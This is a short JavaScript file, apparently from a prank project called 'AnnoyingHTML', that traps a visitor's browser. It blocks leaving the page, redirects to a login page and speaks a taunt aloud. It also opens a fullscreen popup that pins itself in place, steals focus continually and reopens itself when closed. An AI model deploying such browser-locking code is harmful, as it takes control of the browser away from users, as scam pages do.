let newWindow = null;
function onBeforeUnload(e) {
    if (true) {
      e.preventDefault();
      e.returnValue = 'nooo';
      speak('why leave now when you can stay on this website forever')
      gotoUrl("https://hecker7734.github.io/AnnoyingHTML/loginButton/login.html")
      return;
    }
  }
  function speak (phrase) {
    if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
    window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
  }
  
function openCoveringWindow() {
    const screenWidth = screen.availWidth;
    const screenHeight = screen.availHeight;

    newWindow = window.open('', '', `width=${screenWidth}, height=${screenHeight}, fullscreen=yes, toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no`);
    
    if (newWindow) {
        newWindow.document.write(`
        <h1>oops!</h1>
        <script>
            var lastX = window.screenX; // Initialize lastX with initial position
            var lastY = window.screenY; // Initialize lastY with initial position
            setInterval(function(){
                window.moveTo(lastX, lastY); // prevent moving the window
                window.resizeTo(${screenWidth}, ${screenHeight});
            }, 10);
            
        </script>
        `);
        newWindow.onbeforeunload = function() { return false; };
        try {
            setInterval(function () {
                newWindow.focus();
            }, 100);
        } catch (e) {
            console.error('Error focusing on the window:', e);
        }
    } else {
        alert('why you block popups ?');
    }
    newWindow.addEventListener('beforeunload', function(event) {
        // Reopen the covering window after a short delay
        setTimeout(openCoveringWindow, 10); // Adjust the delay as needed
    });
}

document.body.addEventListener('mousemove', function(event) {
    newWindow.focus();
    console.log('Mouse is over the body!');
});